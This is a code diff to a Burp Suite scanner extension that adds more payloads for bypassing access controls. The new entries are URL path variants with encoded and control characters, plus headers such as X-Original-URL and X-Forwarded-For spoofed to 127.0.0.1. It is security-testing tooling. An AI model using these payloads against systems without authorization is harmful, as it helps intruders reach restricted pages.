@@ -56,8 +56,8 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         self.stdout.println(self._helpers.analyzeRequest(baseRequestResponse).getHeaders())
 
 
-        payloads = ["%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/",LastPath+"?",LastPath+"??","/"+LastPath+"//",LastPath+"/",LastPath+"/.randomstring"]
-        hpayloads = ["X-Rewrite-URL: "+OriginalUrl, "X-Original-URL: "+OriginalUrl,"Referer: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Forwarded-For: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Client-IP: 127.0.0.1","X-Host: 127.0.0.1","X-Forwarded-Host: 127.0.0.1"]
+        payloads = ["%2e/"+LastPath, LastPath+"/.", "./"+LastPath+"/./", LastPath+"%20/", "%20"+LastPath+"%20/", LastPath+"..;/",LastPath+"?",LastPath+"??","/"+LastPath+"//",LastPath+"/",LastPath+"/.randomstring","%2f"+LastPath,LastPath+"%09/",LastPath+"///",LastPath+"/*",LastPath+"/*/",LastPath+"\x09",LastPath+"\x0C",LastPath+"\x85",LastPath+"\xA0",LastPath+"\x1C",LastPath+"\x1D",LastPath+"\x1F",LastPath+"\x1E",LastPath+"\x0b",LastPath+";"]
+        hpayloads = ["X-Rewrite-URL: "+OriginalUrl, "X-Original-URL: "+OriginalUrl,"Referer: /"+LastPath, "X-Custom-IP-Authorization: 127.0.0.1","X-Originating-IP: 127.0.0.1","X-Forwarded-For: 127.0.0.1","X-Remote-IP: 127.0.0.1","X-Client-IP: 127.0.0.1","X-Host: 127.0.0.1","X-Forwarded-Host: 127.0.0.1","X-ProxyUser-Ip: 127.0.0.1","X-Original-URL: 127.0.0.1","Client-IP: 127.0.0.1","True-Client-IP: 127.0.0.1","Cluster-Client-IP: 127.0.0.1","Via: 1.0 fred, 1.1 127.0.0.1"]
         results = []
 
         for p in payloads:
